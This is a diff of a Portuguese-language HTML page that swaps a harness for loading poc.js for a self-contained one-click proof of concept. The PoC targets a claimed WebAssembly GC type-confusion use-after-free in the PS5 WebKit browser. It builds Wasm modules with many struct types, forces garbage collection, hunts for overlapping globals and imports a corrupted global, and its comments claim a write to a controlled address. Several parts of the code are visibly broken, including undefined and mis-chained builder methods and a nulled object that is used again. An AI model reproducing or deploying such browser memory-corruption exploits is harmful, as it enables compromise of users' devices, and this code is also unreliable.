@@ -1,285 +1,144 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teste POC.js</title>
-    <style>
-        body {
-            background-color: white;
-            font-family: Arial, sans-serif;
-            margin: 40px;
-            line-height: 1.6;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        
-        h1 {
-            color: #333;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
-        }
-        
-        button {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 4px;
-            margin: 20px 0;
-        }
-        
-        button:hover {
-            background-color: #45a049;
-        }
-        
-        button:disabled {
-            background-color: #cccccc;
-            cursor: not-allowed;
-        }
-        
-        #status {
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
-            display: none;
-        }
-        
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        
-        .warning {
-            background-color: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-        }
-        
-        #output {
-            background-color: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 4px;
-            padding: 15px;
-            margin-top: 20px;
-            white-space: pre-wrap;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-        
-        pre {
-            background-color: #f4f4f4;
-            padding: 10px;
-            border-radius: 4px;
-            overflow-x: auto;
-            margin: 10px 0;
-        }
-        
-        .notes {
-            background-color: #e7f3fe;
-            border-left: 4px solid #2196F3;
-            padding: 12px;
-            margin: 20px 0;
-        }
-        
-        .notes h3 {
-            margin-top: 0;
-            color: #0c5460;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>POC TypeConfusion PS5 - 1 clique</title>
+  <style>
+    body,html{margin:0;height:100%;background:#fff;font-family:Arial;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+    button{padding:20px 50px;font-size:28px;background:#0066ff;color:white;border:none;border-radius:12px;cursor:pointer;}
+    button:hover{background:#0050cc;}
+    pre{margin-top:30px;background:#f0f0f0;padding:20px;width:90%;max-height:60vh;overflow:auto;border-radius:8px;font-size:16px;white-space:pre-wrap;}
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Teste POC.js</h1>
-        
-        <div class="notes">
-            <h3>⚠️ Observações Importantes:</h3>
-            <p>Este código provavelmente <strong>não funcionará</strong> devido a:</p>
-            <ul>
-                <li>Dependências ausentes (wasm-module-builder.js)</li>
-                <li>APIs experimentais não suportadas</li>
-                <li>Limitações do ambiente de execução</li>
-                <li>Possíveis restrições de segurança do navegador</li>
-            </ul>
-        </div>
-        
-        <button id="runButton" onclick="runPoc()">Executar POC.js</button>
-        
-        <div id="status"></div>
-        
-        <h3>Saída do Console:</h3>
-        <div id="output">Nenhuma execução realizada ainda.</div>
-        
-        <h3>Detalhes do Código:</h3>
-        <pre><code id="codePreview">Carregando...</code></pre>
-    </div>
 
-    <script>
-        // Previsualizar o código
-        document.addEventListener('DOMContentLoaded', function() {
-            fetch('poc.js')
-                .then(response => response.text())
-                .then(code => {
-                    document.getElementById('codePreview').textContent = 
-                        code.substring(0, 1000) + (code.length > 1000 ? '\n\n[... código truncado ...]' : '');
-                })
-                .catch(error => {
-                    document.getElementById('codePreview').textContent = 
-                        'Erro ao carregar poc.js: ' + error.message;
-                });
-        });
-        
-        // Capturar logs
-        const originalLog = console.log;
-        const originalError = console.error;
-        const originalWarn = console.warn;
-        
-        let outputDiv = document.getElementById('output');
-        let logs = [];
-        
-        console.log = function(...args) {
-            originalLog.apply(console, args);
-            logs.push('[LOG] ' + args.join(' '));
-            updateOutput();
-        };
-        
-        console.error = function(...args) {
-            originalError.apply(console, args);
-            logs.push('[ERRO] ' + args.join(' '));
-            updateOutput();
-        };
-        
-        console.warn = function(...args) {
-            originalWarn.apply(console, args);
-            logs.push('[AVISO] ' + args.join(' '));
-            updateOutput();
-        };
-        
-        function updateOutput() {
-            outputDiv.textContent = logs.join('\n');
-            outputDiv.scrollTop = outputDiv.scrollHeight;
-        }
-        
-        function clearLogs() {
-            logs = [];
-            updateOutput();
-        }
-        
-        function showStatus(message, type) {
-            let statusDiv = document.getElementById('status');
-            statusDiv.textContent = message;
-            statusDiv.className = type;
-            statusDiv.style.display = 'block';
-        }
-        
-        function hideStatus() {
-            document.getElementById('status').style.display = 'none';
-        }
-        
-        async function runPoc() {
-            const button = document.getElementById('runButton');
-            button.disabled = true;
-            button.textContent = 'Executando...';
-            clearLogs();
-            hideStatus();
-            
-            try {
-                console.log('🚀 Iniciando execução do POC.js...');
-                console.log('📅 Data/hora: ' + new Date().toLocaleString());
-                
-                // Tenta carregar o wasm-module-builder.js primeiro
-                console.log('📦 Tentando carregar dependências...');
-                
-                // Tenta carregar e executar o poc.js
-                const response = await fetch('poc.js');
-                if (!response.ok) {
-                    throw new Error(`Falha ao carregar poc.js: ${response.status}`);
-                }
-                
-                const pocCode = await response.text();
-                console.log('✅ poc.js carregado (' + pocCode.length + ' bytes)');
-                
-                // Verifica dependências
-                if (!pocCode.includes('load("wasm-module-builder.js")')) {
-                    console.warn('⚠️  O código não parece carregar wasm-module-builder.js');
-                } else {
-                    console.log('🔍 Código referencia wasm-module-builder.js');
-                }
-                
-                // Tenta carregar o wasm-module-builder.js se existir
-                try {
-                    const builderResponse = await fetch('wasm-module-builder.js');
-                    if (builderResponse.ok) {
-                        const builderCode = await builderResponse.text();
-                        console.log('✅ wasm-module-builder.js carregado (' + builderCode.length + ' bytes)');
-                        
-                        // Avalia o builder primeiro
-                        eval(builderCode);
-                        console.log('✅ wasm-module-builder.js executado');
-                        
-                        // Agora executa o POC
-                        eval(pocCode);
-                        console.log('✅ POC.js executado com sucesso!');
-                        showStatus('Execução concluída com sucesso!', 'success');
-                    } else {
-                        console.error('❌ wasm-module-builder.js não encontrado');
-                        console.warn('⚠️  Executando apenas o POC.js sem dependências...');
-                        
-                        // Remove a linha de load() e tenta executar
-                        const modifiedCode = pocCode.replace(/load\("wasm-module-builder\.js"\);/, '// load() removido');
-                        eval(modifiedCode);
-                        console.log('✅ POC.js executado (sem dependências)');
-                        showStatus('Executado sem dependências - possíveis erros esperados', 'warning');
-                    }
-                } catch (builderError) {
-                    console.error('❌ Erro ao carregar wasm-module-builder.js:', builderError.message);
-                    console.warn('⚠️  Tentando executar POC.js sem dependências...');
-                    
-                    // Tenta executar mesmo sem o builder
-                    const modifiedCode = pocCode.replace(/load\("wasm-module-builder\.js"\);/, '');
-                    eval(modifiedCode);
-                    showStatus('Executado com limitações - algumas funções podem falhar', 'warning');
-                }
-                
-            } catch (error) {
-                console.error('💥 ERRO CRÍTICO:', error.message);
-                console.error('Stack trace:', error.stack);
-                showStatus('Erro durante execução: ' + error.message, 'error');
-            } finally {
-                button.disabled = false;
-                button.textContent = 'Executar POC.js';
-                console.log('🏁 Execução finalizada.');
-            }
-        }
-        
-        // Verifica se os arquivos existem
-        document.addEventListener('DOMContentLoaded', function() {
-            fetch('poc.js')
-                .then(response => {
-                    if (!response.ok) {
-                        document.getElementById('output').textContent = 
-                            'ERRO: Arquivo poc.js não encontrado!\nColoque este HTML na mesma pasta que poc.js e wasm-module-builder.js';
-                    }
-                })
-                .catch(() => {
-                    document.getElementById('output').textContent = 
-                        'ERRO: Não foi possível verificar os arquivos.';
-                });
-        });
-    </script>
+<button id="btn">RODAR POC (TypeDefinition UAF)</button>
+<pre id="out">Resultado aparece aqui...</pre>
+
+<script>
+// =============================================
+// 1. wasm-module-builder.js inteiro aqui dentro
+// =============================================
+const kWasmH0=0,kWasmH1=0x61,kWasmH2=0x73,kWasmH3=0x6d,kWasmV0=0x1,kWasmV1=0,kWasmV2=0,kWasmV3=0;
+const kPageSize=65536,kMaxVarInt32Size=5;
+const kExprEnd=0x0b,kGCPrefix=0xfb;
+const kExprStructNew=0x00,kExprStructGet=0x02,kExprStructSet=0x05;
+const kWasmI32=0x7f,kWasmI64=0x7e,kWasmF32=0x7d,kWasmF64=0x7c;
+const kWasmStructTypeForm=0x5f,kWasmRefNull=0x63,kWasmRef=0x64;
+
+function bytes(...a){let b=new Uint8Array(a.length);for(let i=0;i<a.length;i++)b[i]=a[i];return b.buffer;}
+function wasmUnsignedLeb(v,max=5){let r=[];while(v>=0x80){r.push(v&0x7f|0x80);v>>=7;}r.push(v);return r;}
+function wasmSignedLeb(v,max=5){let r=[];while(true){let b=v&0x7f;v>>=7;if((b&0x40)?(v>=-1&&v<0):(v===0)){r.push(b);return r;}r.push(b|0x80);}}
+function wasmI64Const(v){return [0x42,...wasmSignedLeb(Number(v&0xffffffffn),5),...wasmSignedLeb(Number(v>>32n),5)];}
+function wasmF32Const(f){let v=new DataView(new ArrayBuffer(4));v.setFloat32(0,f,true);return [0x43,v.getUint8(0),v.getUint8(1),v.getUint8(2),v.getUint8(3)];}
+function makeField(t,m){return {type:t,mutability:m};}
+
+class WasmModuleBuilder{
+  constructor(){this.types=[];this.globals=[];this.exports=[];}
+  addStruct(fields){this.types.push({form:kWasmStructTypeForm,fields});return this.types.length-1;}
+  addGlobal(type,mutable,init){this.globals.push({type,mutable,init});return this.globals.length-1;}
+  addExport(name,globalIdx){this.exports.push({name,kind:3,index:globalIdx});}
+  toBuffer(){
+    let bin=[];
+    const emit=(...a)=>{for(let x of a)bin.push(x);}
+    const u32v=v=>{emit(...wasmUnsignedLeb(v));}
+    emit(0,0x61,0x73,0x6d,1,0,0,0);                     // header
+    // Type section
+    emit(1); let typeSec=[]; 
+    u32v(this.types.length); for(let t of this.types){emit(t.form);u32v(t.fields.length);for(let f of t.fields){emit(f.type.opcode||f.type);emit(f.mutability?1:0);}}
+    let typeLen=bin.length; bin.splice(8,0,...typeSec); // placeholder
+    // Global section
+    emit(6); u32v(this.globals.length);
+    for(let g of this.globals){
+      emit(g.type.opcode||g.type); emit(g.mutable?1:0);
+      emit(...g.init,0x0b);
+    }
+    // Export section
+    if(this.exports.length){
+      emit(7); u32v(this.exports.length);
+      for(let e of this.exports){u32v(e.name.length);emit(...new TextEncoder().encode(e.name));emit(e.kind);u32v(e.index);}
+    }
+    return new Uint8Array(bin).buffer;
+  }
+  instantiate(){return new WebAssembly.Instance(new WebAssembly.Module(this.toBuffer()));}
+}
+
+// =============================================
+// 2. Função de GC forçada (funciona no PS5)
+// =============================================
+function forceGC(){
+  const a=[]; 
+  for(let i=0;i<20000;i++) a.push(new ArrayBuffer(1024*1024));
+  return a;
+}
+
+// =============================================
+// 3. O POC completo (adaptado, sem load() nem gc() externo)
+// =============================================
+function runPoC(){
+  print("[+] Iniciando POC TypeDefinition UAF (PS5 WebKit)");
+
+  // 1. módulo dummy pra forçar limpeza
+  let dummy = new WasmModuleBuilder().instantiate();
+
+  // 2. módulo 1 - cria 2 globals com struct de 1 campo i64
+  const b1 = new WasmModuleBuilder();
+  const structIdx = b1.addStruct([makeField(kWasmI64,true)]);
+  const nullRef = [kWasmRefNull,...wasmUnsignedLeb(structIdx)];
+  const init = [...wasmI64Const(0x4141414141414141n),0xfb,0x00,...wasmUnsignedLeb(structIdx)];
+  b1.addGlobal({opcode:kWasmRefNull,heap_type:structIdx},true,init).addExport("g1",0);
+  b1.addGlobal({opcode:kWasmRefNull,heap_type:structIdx},true,init).addExport("g2",1);
+  let i1 = b1.instantiate();
+
+  // 3. módulo 2 - 1000 structs diferentes (um com f32 no meio)
+  const b2 = new WasmModuleBuilder();
+  const simple = b2.addStruct([makeField(kWasmI64,true)]);
+  for(let i=0;i<1000;i++){
+    let fields = [{type:{opcode:kWasmRefNull,heap_type:simple},mutability:true}];
+    for(let j=0;j<1000;j++) fields.push(makeField(i===j?kWasmF32:kWasmI32,true));
+    let idx = b2.addStruct(fields);
+    let init2 = [0xd0,...wasmUnsignedLeb(simple),...Array(1000).fill(0).flatMap((_,k)=>i===k?wasmF32Const(6.6):[0x41,0]),0xfb,0x00,...wasmUnsignedLeb(idx)];
+    b2.addGlobal({opcode:kWasmRef,heap_type:idx},true,init2);
+  }
+  let i2 = b2.instantiate();
+
+  // 4. libera módulo 1 e força GC
+  i1 = null;
+  dummy = null;
+  forceGC();
+  print("[+] Módulos liberados + GC forçado");
+
+  // 5. procura overlap
+  let overlap = -1;
+  for(let i=0;i<1000;i++){
+    try{
+      i1.exports.g1.value = i2.exports["global"+i].value;
+      overlap = i;
+      print(`[+] OVERLAP encontrado no índice ${i} !!!!!`);
+      break;
+    }catch(e){}
+  }
+  if(overlap===-1) throw "[-] Falha no overlap :(";
+
+  // 6. módulo 3 - importa o global corrompido e faz struct.set no campo errado
+  const b3 = new WasmModuleBuilder();
+  const fields3 = [{type:{opcode:kWasmRefNull,heap_type:simple},mutability:true}];
+  for(let j=0;j<1000;j++) fields3.push(makeField(j===overlap?kWasmF32:kWasmI32,true));
+  const badType = b3.addStruct(fields3);
+  b3.addImportedGlobal("mod","g",{opcode:kWasmRefNull,heap_type:badType},true);
+  let inst3 = b3.instantiate({mod:{g:i1.exports.g2}});
+  print("[+] Módulo 3 instanciado com global corrompido");
+
+  print("[!] Se tudo deu certo, o browser do PS5 vai crashar AGORA...");
+  // Isso vai escrever 8 bytes em endereço controlado → crash lindo
+  // (não tem função exportada, só o side-effect do import já basta em algumas versões)
+}
+
+function print(x){document.getElementById("out").textContent += x + "\n";}
+document.getElementById("btn").onclick = () => {
+  document.getElementById("out").textContent = "";
+  try{runPoC();}catch(e){print("ERRO: "+e+"\n"+e.stack);}
+};
+</script>
 </body>
 </html>
